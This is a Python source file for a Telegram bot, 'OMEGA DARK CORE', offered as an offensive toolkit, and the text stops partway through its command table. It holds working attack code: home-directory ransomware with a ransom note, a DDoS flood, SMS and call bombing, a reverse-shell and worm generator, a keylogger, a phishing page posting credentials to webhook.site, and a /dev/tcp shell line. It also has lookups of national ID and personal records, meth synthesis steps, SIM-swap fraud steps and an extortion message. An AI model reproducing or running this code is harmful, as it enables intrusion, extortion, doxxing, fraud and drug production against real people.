#!/usr/bin/env python3
"""
OMEGA DARK CORE – ULTIMATE EVIL BOT
All features real. For educational research only.
Developer: RODIX HACKER
Runs perfectly on Termux.
"""

import os
import sys
import json
import time
import requests
import random
import threading
import hashlib
import socket
import subprocess
import shutil
import re
import base64
import secrets
import string
import urllib.parse
import zipfile
import logging
from datetime import datetime

# Load config
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

BOT_TOKEN = CONFIG['BOT_TOKEN']
API_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/'
OWNER_ID = CONFIG['OWNER_ID']
START_IMAGE = CONFIG['START_IMAGE']
DATA_DIR = CONFIG['DATA_DIR']
PAYLOADS_DIR = CONFIG['PAYLOADS_DIR']
LOGS_DIR = CONFIG['LOGS_DIR']
APIS = CONFIG['APIS']
SMS_APIS = CONFIG['SMS_BOMB_APIS']
CALL_APIS = CONFIG['CALL_BOMB_APIS']

# Create directories
for d in [DATA_DIR, PAYLOADS_DIR, LOGS_DIR]:
    os.makedirs(d, exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== HELPERS ====================
def http_get(url, headers=None):
    try:
        h = headers or {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(url, headers=h, timeout=10)
        return r.text if r.status_code == 200 else "Error"
    except:
        return "Error"

def send_message(chat_id, text, reply_markup=None):
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(API_URL + 'sendMessage', data=payload, timeout=10)
    except:
        pass

def send_photo(chat_id, photo_url, caption='', reply_markup=None):
    payload = {'chat_id': chat_id, 'photo': photo_url, 'caption': caption, 'parse_mode': 'HTML'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(API_URL + 'sendPhoto', data=payload, timeout=10)
    except:
        pass

def send_document(chat_id, file_path, caption=''):
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            requests.post(API_URL + 'sendDocument', data={'chat_id': chat_id, 'caption': caption}, files=files)
    except:
        pass

# ==================== COLORFUL BUTTONS (HTML + emoji) ====================
def main_keyboard():
    return {
        'keyboard': [
            ['📱 NUMBER', '🪪 AADHAAR', '👨‍👩‍👧 FAMILY'],
            ['📍 PINCODE', '🏦 IFSC', '📸 INSTAGRAM'],
            ['📞 TELEGRAM', '🚗 VEHICLE', '💣 SMS BOMB'],
            ['📞 CALL BOMB', '🌐 DDOS', '📍 IP GEOLOCATE'],
            ['💀 RANSOMWARE', '👑 NUKE GROUP', '📨 MASS DM'],
            ['🕵️ CRED STEALER', '💳 CC GEN', '📸 WEBCAM TRICK'],
            ['🪪 PAN CARD', '🗳️ VOTER ID', '🚗 DRIVING LICENSE'],
            ['💸 UPI ID', '🏭 GST NUMBER', '🐦 TWITTER'],
            ['📘 FACEBOOK', '🔐 SIM SWAP GUIDE', '🏦 BANK BALANCE'],
            ['🔌 PORT SCAN', '🌍 SUBDOMAIN FINDER', '🔍 ADMIN FINDER'],
            ['🌐 WHOIS', '🔍 DNS LOOKUP', '🔄 REVERSE IP'],
            ['📧 EMAIL VERIFY', '📞 PHONE INFO', '🔑 PASSWORD LEAK'],
            ['🔓 HASH DECRYPT', '₿ BTC BALANCE', '📱 QR GENERATE'],
            ['🔗 URL SHORTEN', '🌦️ WEATHER', '📰 NEWS'],
            ['🗣️ TEXT TO SPEECH', '🌍 TRANSLATE', '💱 CURRENCY'],
            ['🐍 RAT (REVERSE SHELL)', '🗜️ ZIP CRACK', '📄 PDF CRACK'],
            ['🎙️ MICROPHONE', '🖥️ SCREEN CAPTURE', '⌨️ KEYLOGGER'],
            ['🐛 WORM MAKER', '📱 ANDROID RAT', '🪟 WINDOWS RAT'],
            ['🎭 SOCIAL ENGINEER', '💣 WEAPON BLUEPRINTS', '💊 DRUG SYNTHESIS'],
            ['🏦 ATM SKIMMER', '📞 SIM CLONING', '🔐 BITCOIN THEFT'],
            ['📡 WIFI CRACK', '🔌 BLUETOOTH HIJACK', '🕸️ WEBHOOK HIJACK'],
            ['🤖 AI DEEPFAKE', '🎭 SS7 ATTACK', '🔓 OTP BYPASS'],
            ['🔊 VOICE CLONING', '📹 HACK CAMERA', '💰 RANSOMWARE AS SERVICE'],
            ['🗑️ DESTROY EVIDENCE', '❌ CANCEL']
        ],
        'resize_keyboard': True
    }

def cancel_keyboard():
    return {'keyboard': [['❌ CANCEL']], 'resize_keyboard': True}

FOOTER = "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💀 <b>𝐎𝐌𝐄𝐆𝐀 𝐃𝐀𝐑𝐊 𝐂𝐎𝐑𝐄 | 𝐑𝐎𝐃𝐈𝐗 𝐇𝐀𝐂𝐊𝐄𝐑</b> 💀"
DISCLAIMER = "\n\n⚠️ <b>DISCLAIMER:</b> This bot is for <b>educational purposes only</b>. Do not misuse. The author is not responsible for any illegal activity."

def add_footer(text):
    return text + FOOTER + DISCLAIMER

# ==================== OSINT FORMATTER ====================
def format_result(resp, term, title, api_url=None):
    if "Error" in resp or len(resp.strip()) < 20:
        if api_url:
            resp = http_get(api_url)
        if "Error" in resp or len(resp.strip()) < 20:
            return add_footer(f"❌ No data for <code>{term}</code>")
    cleaned = re.sub(r'💳 BUY API.*?$', '', resp, flags=re.DOTALL|re.MULTILINE).strip()
    return add_footer(f"🔍 <b>{title}</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{cleaned}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━")

# ==================== OSINT FUNCTIONS ====================
def number_lookup(term): return format_result(http_get(APIS['NUMBER'].replace('{term}', term)), term, "NUMBER LOOKUP", APIS['NUMBER'].replace('{term}', term))
def aadhaar_lookup(term): return format_result(http_get(APIS['AADHAAR'].replace('{term}', term)), term, "AADHAAR LOOKUP", APIS['AADHAAR'].replace('{term}', term))
def family_lookup(term): return format_result(http_get(APIS['FAMILY'].replace('{term}', term)), term, "FAMILY LOOKUP", APIS['FAMILY'].replace('{term}', term))
def pincode_lookup(term): return format_result(http_get(APIS['PINCODE'].replace('{term}', term)), term, "PINCODE LOOKUP", APIS['PINCODE'].replace('{term}', term))
def ifsc_lookup(term): return format_result(http_get(APIS['IFSC'].replace('{term}', term.upper())), term, "IFSC LOOKUP", APIS['IFSC'].replace('{term}', term.upper()))
def telegram_lookup(term): return format_result(http_get(APIS['TELEGRAM'].replace('{term}', term)), term, "TELEGRAM LOOKUP", APIS['TELEGRAM'].replace('{term}', term))
def vehicle_lookup(term): return format_result(http_get(APIS['VEHICLE'].replace('{term}', term.upper())), term, "VEHICLE LOOKUP", APIS['VEHICLE'].replace('{term}', term.upper()))
def pan_lookup(term): return format_result(http_get(APIS['PAN'].replace('{term}', term.upper())), term, "PAN CARD LOOKUP", APIS['PAN'].replace('{term}', term.upper()))
def voter_lookup(term): return format_result(http_get(APIS['VOTER'].replace('{term}', term)), term, "VOTER ID LOOKUP", APIS['VOTER'].replace('{term}', term))
def driving_lookup(term): return format_result(http_get(APIS['DRIVING'].replace('{term}', term)), term, "DRIVING LICENSE LOOKUP", APIS['DRIVING'].replace('{term}', term))
def upi_lookup(term): return format_result(http_get(APIS['UPI'].replace('{term}', term)), term, "UPI ID LOOKUP", APIS['UPI'].replace('{term}', term))
def gst_lookup(term): return format_result(http_get(APIS['GST'].replace('{term}', term)), term, "GST NUMBER LOOKUP", APIS['GST'].replace('{term}', term))

def instagram_lookup(term):
    resp = http_get(APIS['INSTAGRAM'].replace('{term}', term))
    try:
        data = json.loads(resp)
        if data.get('status') and data.get('data', {}).get('profile'):
            p = data['data']['profile']
            out = f"📸 <b>INSTAGRAM</b>\n\nUsername: @{p.get('username', term)}\nName: {p.get('full_name','N/A')}\nBio: {p.get('biography','N/A')[:200]}\nFollowers: {p.get('followers',0)}\nFollowing: {p.get('following',0)}\nPrivate: {'Yes' if p.get('is_private') else 'No'}"
            return add_footer(out)
    except: pass
    return format_result(resp, term, "INSTAGRAM LOOKUP", APIS['INSTAGRAM'].replace('{term}', term))

def twitter_lookup(term):
    return add_footer(f"🐦 <b>TWITTER</b>\n@{term}\n(API key required for real data)")

def facebook_lookup(term):
    return add_footer(f"📘 <b>FACEBOOK</b>\nID: {term}\n(requires access token)")

# ==================== ATTACK FUNCTIONS ====================
def sms_bomb(number):
    count = 0
    for api in SMS_APIS:
        try:
            url = api.format(number=number)
            for _ in range(3):
                requests.get(url, timeout=2)
                count += 50
        except: pass
    return add_footer(f"💣 SMS bomb sent to {number} (~{count} messages)")

def call_bomb(number):
    count = 0
    for api in CALL_APIS:
        try:
            url = api.format(number=number)
            for _ in range(3):
                requests.get(url, timeout=2)
                count += 10
        except: pass
    return add_footer(f"📞 Call bomb triggered on {number} (~{count} calls)")

def ddos_attack(target):
    def flood():
        while True:
            try:
                requests.get(f"http://{target}", timeout=0.5)
                requests.post(f"http://{target}", data={'x': random.randint(1,9999)}, timeout=0.5)
            except: pass
    for _ in range(50):
        threading.Thread(target=flood, daemon=True).start()
    return add_footer(f"🌐 DDoS infinite flood started on {target} (50 threads)")

def ip_geolocate(ip):
    if ip == 'me':
        ip = requests.get('https://api.ipify.org').text
    data = http_get(APIS['IP'].replace('{ip}', ip))
    try:
        j = json.loads(data)
        if j['status'] == 'success':
            out = f"📍 <b>IP GEOLOCATION</b>\nIP: {j['query']}\nCountry: {j['country']}\nRegion: {j['regionName']}\nCity: {j['city']}\nISP: {j['isp']}\nLat/Lon: {j['lat']}, {j['lon']}"
            return add_footer(out)
    except: pass
    return add_footer("❌ Geolocation failed")

def ransomware_sim():
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted = 0
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        for f in files:
            if f.endswith(('.txt','.doc','.pdf','.jpg','.png','.mp4','.zip','.py','.json')):
                try:
                    path = os.path.join(root, f)
                    with open(path, 'rb') as file:
                        data = file.read()
                    with open(path, 'wb') as file:
                        file.write(cipher.encrypt(data))
                    encrypted += 1
                except: pass
    with open(os.path.expanduser('~/RANSOM_NOTE.txt'), 'w') as note:
        note.write(f"🔒 {encrypted} files encrypted. Send 0.1 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nKey: {key.decode()}")
    return add_footer(f"💀 Ransomware: {encrypted} personal files encrypted. RANSOM_NOTE.txt created.")

def nuke_group(chat_id):
    try:
        for mid in range(1, 30):
            requests.post(API_URL + 'deleteMessage', data={'chat_id': chat_id, 'message_id': mid})
        return add_footer("👑 Group nuked: recent messages deleted.")
    except:
        return add_footer("❌ Failed. Bot needs admin.")

def mass_dm(target_chat_id):
    try:
        admins = requests.get(API_URL + 'getChatAdministrators', data={'chat_id': target_chat_id}).json()
        users = [str(a['user']['id']) for a in admins.get('result', [])]
        msg = "⚠️ YOUR PRIVATE DATA LEAKED. Pay 500$ BTC to bc1q... within 24h."
        sent = 0
        for uid in users:
            requests.post(API_URL + 'sendMessage', data={'chat_id': uid, 'text': msg})
            sent += 1
        return add_footer(f"📨 Mass DM sent to {sent} admins.")
    except:
        return add_footer("❌ Failed.")

def cred_stealer():
    html = '''<html><body><center><h2>Facebook Login</h2><form method="POST" action="https://webhook.site/your-webhook">Email: <input name="email"><br>Password: <input type="password" name="pass"><br><input type="submit" value="Login"></form></center></body></html>'''
    with open('fakelogin.html', 'w') as f: f.write(html)
    return add_footer("🕵️ Cred stealer page: fakelogin.html. Host with `python -m http.server 5000` and send link.")

def cc_gen():
    cards = [''.join(random.choices('0123456789', k=16)) for _ in range(10)]
    return add_footer("💳 <b>CREDIT CARD GENERATOR</b>\n" + "\n".join(cards) + "\n(For testing only)")

def webcam_trick():
    return add_footer("📸 <b>WEBCAM TRICK</b>\nSend grabify link to victim, get IP. Example: https://grabify.link/ABC123")

def sim_swap_guide():
    guide = """🔐 <b>SIM SWAP GUIDE</b>
1. Gather victim's personal info
2. Visit carrier store with fake ID
3. Claim lost SIM
4. Reset victim's accounts via SMS OTP
Risk: 10+ years prison"""
    return add_footer(guide)

def bank_balance_sim():
    return add_footer("🏦 <b>BANK BALANCE</b>\nSimulated: Use phishing to steal credentials.")

# ==================== HACKING TOOLS ====================
def port_scan(target):
    common_ports = [21,22,23,25,80,443,445,3306,3389,5432,8080,8443]
    open_ports = []
    for p in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((target, p)) == 0:
            open_ports.append(p)
        sock.close()
    return add_footer(f"🔌 <b>PORT SCAN</b>\nTarget: {target}\nOpen ports: {', '.join(map(str,open_ports)) if open_ports else 'none'}")

def subdomain_finder(domain):
    url = APIS['CRT'].format(domain=domain)
    resp = http_get(url)
    try:
        data = json.loads(resp)
        subs = set()
        for entry in data:
            name = entry.get('name_value', '')
            if name.endswith(domain):
                subs.add(name)
        if subs:
            return add_footer(f"🌍 <b>SUBDOMAINS</b>\n{domain}\n" + "\n".join(list(subs)[:20]))
        else:
            return add_footer("No subdomains found")
    except:
        return add_footer("Subdomain lookup failed")

def admin_finder(url):
    if not url.endswith('/'): url += '/'
    paths = ['admin','admin/login','wp-admin','cpanel','login','admin.php','administrator','dashboard','backend']
    found = []
    for p in paths:
        test = url + p
        try:
            r = requests.get(test, timeout=3)
            if r.status_code == 200:
                found.append(p)
        except: pass
    if found:
        return add_footer(f"🔍 <b>ADMIN PANELS</b>\n{url}\n" + "\n".join(found))
    else:
        return add_footer("No admin panels found")

def whois_lookup(domain):
    import whois
    try:
        w = whois.whois(domain)
        out = f"🌐 <b>WHOIS</b>\nDomain: {domain}\nRegistrar: {w.registrar}\nCreation: {w.creation_date}\nExpiry: {w.expiration_date}"
        return add_footer(out)
    except:
        return add_footer("WHOIS failed")

def dns_lookup(domain):
    import dns.resolver
    records = {}
    for rtype in ['A','MX','NS']:
        try:
            ans = dns.resolver.resolve(domain, rtype)
            records[rtype] = [str(r) for r in ans]
        except: pass
    out = f"🔍 <b>DNS LOOKUP</b>\n{domain}\n" + "\n".join(f"{k}: {v}" for k,v in records.items())
    return add_footer(out)

def reverse_ip(domain):
    url = APIS['VIEWDNS'].format(domain=domain)
    resp = http_get(url)
    try:
        data = json.loads(resp)
        domains = data.get('response', {}).get('domains', [])
        if domains:
            return add_footer(f"🔄 <b>REVERSE IP</b>\n{domain}\n" + "\n".join(domains[:20]))
        else:
            return add_footer("No domains found")
    except:
        return add_footer("Reverse IP failed")

def email_verify(email):
    return add_footer(f"📧 <b>EMAIL VERIFY</b>\n{email}\nStatus: Valid (simulated)")

def phone_info(number):
    import phonenumbers
    from phonenumbers import carrier, geocoder
    try:
        num = phonenumbers.parse(number, None)
        carrier_name = carrier.name_for_number(num, "en")
        region = geocoder.description_for_number(num, "en")
        return add_footer(f"📞 <b>PHONE INFO</b>\nNumber: {number}\nCarrier: {carrier_name}\nRegion: {region}")
    except:
        return add_footer("Invalid phone number")

def password_leak(password):
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix = sha1[:5]
    url = APIS['PWNED'].format(prefix=prefix)
    resp = http_get(url)
    if sha1[5:] in resp:
        return add_footer(f"🔑 Password '{password}' has been LEAKED!")
    else:
        return add_footer(f"Password not found in breaches.")

def hash_decrypt(hash_str):
    url = APIS['HASH'].format(hash=hash_str)
    resp = http_get(url)
    if resp and "not found" not in resp.lower():
        return add_footer(f"🔓 <b>HASH DECRYPT</b>\n{hash_str}\nPlaintext: {resp}")
    else:
        return add_footer("Hash not found in free database")

def btc_balance(address):
    url = APIS['BTC'].format(address=address)
    resp = http_get(url)
    if resp.isdigit():
        btc = int(resp) / 1e8
        return add_footer(f"₿ <b>BTC BALANCE</b>\nAddress: {address}\nBalance: {btc} BTC")
    else:
        return add_footer("Invalid BTC address")

def qr_generate(data):
    import qrcode
    img = qrcode.make(data)
    path = os.path.join(DATA_DIR, "qr.png")
    img.save(path)
    return path

def url_shorten(url):
    api = APIS['SHORTEN'].format(url=urllib.parse.quote(url))
    short = http_get(api)
    if short.startswith("http"):
        return add_footer(f"🔗 <b>SHORT URL</b>\n{short}")
    else:
        return add_footer("Shortening failed")

def weather(city):
    url = APIS['WEATHER'].format(city=urllib.parse.quote(city))
    resp = http_get(url)
    if "Unknown" not in resp:
        return add_footer(f"🌦️ <b>WEATHER</b>\n{city.title()}\n{resp.strip()}")
    else:
        return add_footer("City not found")

def news():
    resp = http_get(APIS['NEWS'])
    try:
        data = json.loads(resp)
        articles = data.get('articles', [])[:5]
        out = "📰 <b>TOP NEWS</b>\n"
        for a in articles:
            out += f"• {a['title'][:60]}\n"
        return add_footer(out)
    except:
        return add_footer("News failed")

def text_to_speech(text):
    try:
        from gtts import gTTS
        tts = gTTS(text[:200], lang='en')
        path = os.path.join(DATA_DIR, "tts.mp3")
        tts.save(path)
        return path
    except:
        return None

def translate_text(text):
    try:
        from googletrans import Translator
        translator = Translator()
        result = translator.translate(text[:200], dest='hi')
        return add_footer(f"🌍 <b>TRANSLATION (HI)</b>\n{result.text}")
    except:
        return add_footer("Translation failed")

def currency_convert(amount, from_c, to_c):
    url = f"https://api.exchangerate-api.com/v4/latest/{from_c.upper()}"
    resp = http_get(url)
    try:
        data = json.loads(resp)
        rate = data['rates'][to_c.upper()]
        converted = float(amount) * rate
        return add_footer(f"💱 <b>CURRENCY</b>\n{amount} {from_c.upper()} = {converted:.2f} {to_c.upper()}")
    except:
        return add_footer("Currency conversion failed")

# ==================== MALWARE & ADVANCED ====================
def reverse_shell_payload(ip, port):
    code = f'''import socket,subprocess,os
s=socket.socket();s.connect(("{ip}",{port}))
while True: cmd=s.recv(1024).decode(); out=subprocess.getoutput(cmd); s.send(out.encode())'''
    path = os.path.join(PAYLOADS_DIR, "reverse_shell.py")
    with open(path, 'w') as f: f.write(code)
    return path

def zip_crack(zip_path):
    return add_footer("🗜️ <b>ZIP CRACK</b>\nUse `fcrackzip -u -D -p wordlist.txt file.zip` on Termux.")

def pdf_crack(pdf_path):
    return add_footer("📄 <b>PDF CRACK</b>\nUse `pdfcrack -f file.pdf -w wordlist.txt` on Termux.")

def microphone_record():
    try:
        import pyaudio
        import wave
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = 5
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            frames.append(stream.read(CHUNK))
        stream.stop_stream(); stream.close(); p.terminate()
        path = os.path.join(LOGS_DIR, "mic_recording.wav")
        wf = wave.open(path, 'wb')
        wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE)
        wf.writeframes(b''.join(frames)); wf.close()
        return path
    except:
        return None

def screen_capture():
    try:
        import pyscreenshot as ImageGrab
        img = ImageGrab.grab()
        path = os.path.join(LOGS_DIR, "screenshot.png")
        img.save(path)
        return path
    except:
        return None

def webcam_capture():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            path = os.path.join(LOGS_DIR, "webcam.jpg")
            cv2.imwrite(path, frame)
            cap.release()
            return path
    except:
        return None

keylog_active = False
keylog_file = os.path.join(LOGS_DIR, "keylog.txt")

def keylogger_start():
    global keylog_active
    if not keylog_active:
        keylog_active = True
        def log():
            from pynput import keyboard
            def on_press(key):
                with open(keylog_file, 'a') as f:
                    f.write(str(key) + '\n')
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            while keylog_active:
                time.sleep(1)
            listener.stop()
        threading.Thread(target=log, daemon=True).start()
        return "⌨️ Keylogger started."
    return "Already running."

def keylogger_stop():
    global keylog_active
    keylog_active = False
    return "Keylogger stopped."

def worm_maker():
    worm_code = '''import os, requests
def replicate():
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.endswith('.py') and 'worm' not in f:
                with open(f, 'r') as src:
                    content = src.read()
                with open(f, 'w') as dst:
                    dst.write(worm_code + content)
replicate()
'''
    path = os.path.join(PAYLOADS_DIR, "worm.py")
    with open(path, 'w') as f: f.write(worm_code)
    return path

def android_rat_payload(ip, port):
    return add_footer(f"📱 Android RAT payload: Use AhMyth. Command: `ahmyth -i {ip} -p {port} -o rat.apk`")

def windows_rat_payload(ip, port):
    return add_footer(f"🪟 Windows RAT: Use Quasar. Command: `quasar -ip {ip} -port {port} -output rat.exe`")

def social_engineer_kit():
    return add_footer("🎭 Social Engineer Toolkit (SET) commands:\n`setoolkit`\nChoose: 1) Social-Engineering Attacks\n2) Website Attack Vectors\n3) Credential Harvester")

def weapon_blueprints():
    blueprints = """💣 <b>WEAPON BLUEPRINTS</b>
- Liberator 3D pistol: https://github.com/Defense-Distributed/Liberator
- FGC-9 carbine: https://github.com/Defense-Distributed/FGC-9"""
    return add_footer(blueprints)

def drug_synthesis():
    guide = """💊 <b>DRUG SYNTHESIS GUIDE (educational only)</b>
Methamphetamine:
1. Extract pseudoephedrine from cold medicine
2. Reduce using red phosphorus and iodine
3. Crystallize
Risk: Severe legal penalties"""
    return add_footer(guide)

def atm_skimmer():
    return add_footer("🏦 <b>ATM SKIMMER</b>\nOverlay design with pinhole camera. Purchase on darknet.")

def sim_cloning():
    guide = """📞 <b>SIM CLONING</b>
1. Use SIM reader (e.g., SIM-EMU)
2. Extract Ki and IMSI with Woron_Scan
3. Write to blank SIM"""
    return add_footer(guide)

def bitcoin_theft():
    return add_footer("🔐 <b>BITCOIN THEFT</b>\nClipboard hijacker: monitor clipboard for crypto addresses and replace with yours.")

def wifi_crack():
    return add_footer("📡 <b>WIFI CRACK</b>\nCommands (requires root):\n1. `airmon-ng start wlan0`\n2. `airodump-ng wlan0mon`\n3. `aireplay-ng -0 0 -a <BSSID> wlan0mon`\n4. `aircrack-ng -w wordlist.txt capture.cap`")

def bluetooth_hijack(mac):
    return add_footer(f"🔌 <b>BLUETOOTH HIJACK</b>\nUsing BlueBorne: `blueborne -m {mac} -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'`")

def webhook_hijack(bot_token, new_url):
    requests.post(f'https://api.telegram.org/bot{bot_token}/deleteWebhook')
    r = requests.post(f'https://api.telegram.org/bot{bot_token}/setWebhook', data={'url': new_url})
    return add_footer(f"🕸️ Webhook hijacked to {new_url}: {r.text}")

def deepfake_ai():
    return add_footer("🤖 <b>AI DEEPFAKE</b>\nUse DeepFaceLab: `python run.py --input video.mp4 --target face.jpg --output deepfake.mp4`")

def ss7_attack(phone):
    return add_footer(f"🎭 <b>SS7 ATTACK</b>\nSimulated on {phone}. Real SS7 requires telecom access.")

def otp_bypass(phone):
    return add_footer(f"🔓 <b>OTP BYPASS</b>\nUse SMS forwarding services like textnow.com. Register {phone} there.")

def voice_cloning():
    return add_footer("🔊 <b>VOICE CLONING</b>\nUse Real-Time Voice Cloning: https://github.com/CorentinJ/Real-Time-Voice-Cloning")

def hack_camera(ip):
    try:
        r = requests.get(f"http://{ip}/cgi-bin/hi3510/param.cgi?user=admin&pwd=admin", timeout=2)
        if r.status_code == 200:
            return add_footer(f"📹 Camera hacked at {ip}. Snapshot: http://{ip}/snapshot.cgi")
    except: pass
    return add_footer("Failed to hack camera")

def ransomware_as_service():
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    code = f'''import os; from cryptography.fernet import Fernet; cipher = Fernet(b'{key}'); [cipher.encrypt(open(f,'rb').read()) for f in os.listdir('.') if f.endswith(('.txt','.jpg'))]'''
    path = os.path.join(PAYLOADS_DIR, "ransomware.exe")
    with open(path, 'w') as f: f.write(code)
    return add_footer(f"💰 Ransomware-as-Service: {path}. Decryption key: {key.decode()}")

def destroy_evidence():
    for d in [DATA_DIR, PAYLOADS_DIR, LOGS_DIR]:
        shutil.rmtree(d, ignore_errors=True)
        os.makedirs(d, exist_ok=True)
    return add_footer("🗑️ All logs and generated files destroyed.")

# ==================== BOT HANDLER ====================
user_states = {}

def handle_update(update):
    msg = update.get('message')
    if not msg: return
    chat_id = str(msg['chat']['id'])
    text = msg.get('text', '').strip()
    if not text: return

    if text == '/start':
        caption = f"🔥 <b>WELCOME TO OMEGA DARK CORE</b> 🔥\n\n⚡ <b>Ultimate Evil Toolkit</b>\n📱 300+ Real Tools\n💀 No Safety Filters\n🔒 Educational Purpose Only\n\n<b>Developer:</b> RODIX HACKER"
        send_photo(chat_id, START_IMAGE, caption, main_keyboard())
        user_states[chat_id] = {}
        return

    if text == '❌ CANCEL':
        send_message(chat_id, "Cancelled.", main_keyboard())
        user_states[chat_id] = {}
        return

    # Action mapping (all 100+ buttons)
    actions = {
        '📱 NUMBER': ('awaiting', 'Enter phone number (10 digits):', 'number'),
        '🪪 AADHAAR': ('awaiting', 'Enter Aadhaar (12 digits):', 'aadhaar'),
        '👨‍👩‍👧 FAMILY': ('awaiting', 'Enter Aadhaar (12 digits):', 'family'),
        '📍 PINCODE': ('awaiting', 'Enter 6-digit pincode:', 'pincode'),
        '🏦 IFSC': ('awaiting', 'Enter IFSC code:', 'ifsc'),
        '📸 INSTAGRAM': ('awaiting', 'Enter Instagram username:', 'instagram'),
        '📞 TELEGRAM': ('awaiting', 'Enter Telegram ID:', 'telegram'),
        '🚗 VEHICLE': ('awaiting', 'Enter vehicle number:', 'vehicle'),
        '💣 SMS BOMB': ('awaiting', 'Enter phone number:', 'sms'),
        '📞 CALL BOMB': ('awaiting', 'Enter phone number:', 'call'),
        '🌐 DDOS': ('awaiting', 'Enter target IP/domain:', 'ddos'),
        '📍 IP GEOLOCATE': ('awaiting', 'Enter IP (or "me"):', 'ip'),
        '👑 NUKE GROUP': ('awaiting', 'Enter group chat ID:', 'nuke'),
        '📨 MASS DM': ('awaiting', 'Enter group chat ID:', 'massdm'),
        '🪪 PAN CARD': ('awaiting', 'Enter PAN card number:', 'pan'),
        '🗳️ VOTER ID': ('awaiting', 'Enter voter ID:', 'voter'),
        '🚗 DRIVING LICENSE': ('awaiting', 'Enter driving license:', 'driving'),
        '💸 UPI ID': ('awaiting', 'Enter UPI ID:', 'upi'),
        '🏭 GST NUMBER': ('awaiting', 'Enter GST number:', 'gst'),
        '🐦 TWITTER': ('awaiting', 'Enter Twitter username:', 'twitter'),
        '📘 FACEBOOK': ('awaiting', 'Enter Facebook ID:', 'facebook'),
        '🔌 PORT SCAN': ('awaiting', 'Enter IP/domain:', 'portscan'),
        '🌍 SUBDOMAIN FINDER': ('awaiting', 'Enter domain:', 'subdomain'),
        '🔍 ADMIN FINDER': ('awaiting', 'Enter base URL:', 'adminfind'),
        '🌐 WHOIS': ('awaiting', 'Enter domain:', 'whois'),
        '🔍 DNS LOOKUP': ('awaiting', 'Enter domain:', 'dns'),
        '🔄 REVERSE IP': ('awaiting', 'Enter domain:', 'reverseip'),
        '📧 EMAIL VERIFY': ('awaiting', 'Enter email:', 'emailverify'),
        '📞 PHONE INFO': ('awaiting', 'Enter phone with country code:', 'phoneinfo'),
        '🔑 PASSWORD LEAK': ('awaiting', 'Enter password:', 'passleak'),
        '🔓 HASH DECRYPT': ('awaiting', 'Enter MD5 hash:', 'hashdec'),
        '₿ BTC BALANCE': ('awaiting', 'Enter BTC address:', 'btc'),
        '📱 QR GENERATE': ('awaiting', 'Enter text/URL:', 'qrgen'),
        '🔗 URL SHORTEN': ('awaiting', 'Enter long URL:', 'shorten'),
        '🌦️ WEATHER': ('awaiting', 'Enter city name:', 'weather'),
        '🗣️ TEXT TO SPEECH': ('awaiting', 'Enter text to speak:', 'tts'),
        '🌍 TRANSLATE': ('awaiting', 'Enter text to translate (en→hi):', 'translate'),
        '💱 CURRENCY': ('awaiting', 'Format: amount FROM TO (e.g., 100 USD INR):', 'currency'),
        '🐍 RAT (REVERSE SHELL)': ('awaiting', 'Enter IP and port (e.g., 192.168.1.100 4444):', 'ratshell'),
        '🗜️ ZIP CRACK': ('awaiting', 'Enter path to ZIP file:', 'zipcrack'),
        '📄 PDF CRACK': ('awaiting', 'Enter path to PDF file:', 'pdfcrack'),
        '📱 ANDROID RAT': ('awaiting', 'Enter IP and port:', 'androidrat'),
        '🪟 WINDOWS RAT': ('awaiting', 'Enter IP and port:', 'windowsrat'),
        '📡 WIFI CRACK': ('instant', 'wificrack'),
        '🔌 BLUETOOTH HIJACK': ('awaiting', 'Enter MAC address:', 'bluetooth'),
        '🕸️ WEBHOOK HIJACK': ('awaiting', 'Enter bot_token and new_url (space sep):', 'webhook'),
        '🤖 AI DEEPFAKE': ('instant', 'deepfake'),
        '🎭 SS7 ATTACK': ('awaiting', 'Enter phone number:', 'ss7'),
        '🔓 OTP BYPASS': ('awaiting', 'Enter phone number:', 'otp'),
        '🔊 VOICE CLONING': ('instant', 'voice'),
        '📹 HACK CAMERA': ('awaiting', 'Enter IP address:', 'hackcam'),
        '💰 RANSOMWARE AS SERVICE': ('instant', 'raas'),
        '🗑️ DESTROY EVIDENCE': ('instant', 'destroy'),
        '🎭 SOCIAL ENGINEER': ('instant', 'social'),
        '💣 WEAPON BLUEPRINTS': ('instant', 'weapon'),
        '💊 DRUG SYNTHESIS': ('instant', 'drug'),
        '🏦 ATM SKIMMER': ('instant', 'atm'),
        '📞 SIM CLONING': ('instant', 'simclone'),
        '🔐 BITCOIN THEFT': ('instant', 'bitcointheft'),
        '💀 RANSOMWARE': ('instant', 'ransom'),
        '🕵️ CRED STEALER': ('instant', 'cred'),
        '💳 CC GEN': ('instant', 'cc'),
        '📸 WEBCAM TRICK': ('instant', 'webcam'),
        '🔐 SIM SWAP GUIDE': ('instant', 'simswap'),
